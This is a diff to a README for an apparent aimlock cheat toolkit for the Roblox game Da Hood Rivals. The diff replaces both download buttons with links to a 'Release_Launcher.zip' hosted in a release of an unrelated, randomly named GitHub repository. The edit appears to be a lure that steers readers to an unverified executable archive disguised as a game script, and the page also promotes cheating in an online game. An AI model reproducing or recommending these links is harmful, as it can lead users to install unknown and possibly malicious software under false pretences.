@@ -1,6 +1,6 @@
 <img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/17733bba-f851-4fc5-a8d5-147636640b2e" />
 
-[![Download Button](https://img.shields.io/badge/DOWNLOAD-DaHoodRivals%20Script-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://BarrierTiger.github.io/Da-hood-Rivals-AimOptimizer/)
+[![Download Button](https://img.shields.io/badge/DOWNLOAD-DaHoodRivals%20Script-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip)
 
 # 🎯 Da Hood | RIVALS Combat Lab 2026 — Aimlock Training & Progression Toolkit
 
@@ -319,4 +319,4 @@ Contributions are welcome across code, translations, drill packs, and route subm
 
 Da Hood Combat Lab 2026 is a long project about a simple belief: deliberate practice beats luck over time. The lab does not reward impatience, and it does not pretend that mastery is instant. It simply measures, records, and reports — and then hands the results back so that the next session is a little better than the last.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://BarrierTiger.github.io/Da-hood-Rivals-AimOptimizer/)
+[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip)
